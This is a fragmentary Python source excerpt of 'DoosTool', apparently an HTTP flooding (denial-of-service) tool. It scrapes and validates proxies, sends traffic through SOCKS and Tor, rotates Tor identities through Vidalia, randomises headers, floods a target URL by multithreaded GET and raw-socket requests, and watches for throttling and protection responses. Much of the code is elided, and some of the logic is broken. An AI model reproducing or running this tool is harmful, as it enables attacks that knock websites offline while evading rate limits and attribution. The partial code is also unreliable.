...
class DoosTool(object):
    def __init__(self, CONCURRENCY_TYPE, PROXY_TYPE):
        ...
        self.payload = self.url = self.additional_headers = self.SOCKET_DATA = self.proxies = ''
        ...
        self.printed_msgs = self.ip_list = []
        self.tor_proxies, self.SS_PROXIES = {"http": "socks5://127.0.0.1:9050", 'https': 'socks5://127.0.0.1:9050'}, {
            ...
            for i in ip_add_list:
                ...
                def get():
                    try:
                        ...
                        headers = {
                            'User-Agent': random.choice(self.headers_useragents).encode('utf-8').decode(
                                'utf-8-sig').strip(),
                            'Accept-Encoding': 'gzip, deflate, sdch',
                            'Accept-language': 'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4',
                            'Referer': i.strip(),
                        ...
                        if res.status_code == 200:
                            list = re.findall(
                                r'(?:((?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5]))\D+?(6[0-5]{2}[0-3][0-5]|[1-5]\d{4}|[1-9]\d{1,3}|[0-9]))',
                                res.text)
    ...
    def check_ip_list(self):
        ...
        if not self.ip_list:
            with open('C:/Documents and Settings/Administrator/桌面/ip_list.txt', 'r',
                      encoding='utf-8') as get_referer_list:
    ...
    def check_ip(self, IP):
        if requests.get('http://cocbus.com/ip', proxies={"http": str(IP), 'https': str(IP)},
                        timeout=7).status_code == 200:
            print('此IP有效!')
            return True
    ...
    def init_headers(self):
        if random.randint(1, 2) == 1:
            ...
            self.headers['Referer'] = random.choice(self.referer_list).encode('utf-8').decode(
                'utf-8-sig').strip() + self.random_string(random.randint(5, 10))
    ...
    def send_get(self):
        ...
        def try_():
            try:
                request = requests.get(self.url, headers=self.init_headers(), proxies=self.proxies,
                ...
                if self.request_counter % self.CHECK_TIME == 0:
                    ...
                    if request.status_code == 500 or 502 or 504:
                        ...
                        self.print_msg("This site were be protect")  # protect
                        time.sleep(10)
                    if request.status_code == 429: self.print_msg("You have been throttled")
    ...
    def socket_sendget(self):
        ...
        if self.is_wordpress: SOCKET_DATA = self.SOCKET_DATA.replace('T /',
    ...
    def main(self, argv):
        ...
        self.additional_headers = args.ah
        ...
        if len(sys.argv) == 1:
            ...
            if args.g:
                ...
                self.url, self.payload = args.p, args.d
            if args.P:
                self.proxies = self.SS_PROXIES
            elif args.P == 2:
                self.proxies = self.tor_proxies
    ...
    def auto_control(self):
        ...
        if self.is_socket_mode: THIS_CONCURRENCY_TYPE['EVAL1'] = THIS_CONCURRENCY_TYPE['EVAL1'].replace('send',
                                                                                                        'SOCKET_send')
        for i in range(self.THREADS_NUM):
    ...
    def vidalia_change_ip(self):
        ...
        def check_exsit(process_name):
            ...
            if win32com.client.GetObject('winmgmts:').ExecQuery(
                            'select * from Win32_Process where Name="%s"' % process_name): return True
        ...
        try:
            ...
            print("Has Exception:发生异常：" + str(
                e))  # if str(e)=="(2, 'FindWindow', '系统找不到指定的文件。')": if str(e)=="name 'VidaliaHwnd' is not defined":
